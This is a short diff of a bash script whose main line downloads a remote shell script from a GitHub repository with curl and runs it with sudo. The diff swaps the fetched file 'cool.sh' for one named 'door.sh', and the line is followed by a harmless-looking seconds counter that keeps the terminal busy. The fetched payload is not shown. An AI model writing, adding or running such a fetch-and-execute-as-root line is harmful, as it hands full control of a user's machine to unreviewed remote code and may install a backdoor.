@@ -1,3 +1,3 @@
 #!/bin/bash
-curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/cool.sh;sudo bash cool.sh
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/door.sh;sudo bash door.sh
 i=0; while true; do echo -ne "\r$i seconds"; ((i++)); sleep 1; done
